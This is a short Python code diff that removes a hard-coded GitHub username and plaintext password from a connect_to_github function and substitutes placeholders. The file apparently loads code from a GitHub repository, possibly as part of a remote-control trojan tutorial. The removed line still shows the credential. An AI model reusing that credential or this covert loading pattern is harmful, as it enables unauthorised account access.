@@ -42,8 +42,7 @@ class GitImporter(object):
 
 # Realiza a autenticacao do repositorio Git e obtem objetos "repo" e "branch"
 def connect_to_github():
-    gh = login(username='testing-gt', password='Git@4321')
-    #gh = login(username='xxxxxxxxx', password='xxxxxxxxx')
+    gh = login(username='xxxxxxxxx', password='xxxxxxxxx')
     repo = gh.repository('testing-gt', 'cap7')
     branch = repo.branch("master")
 
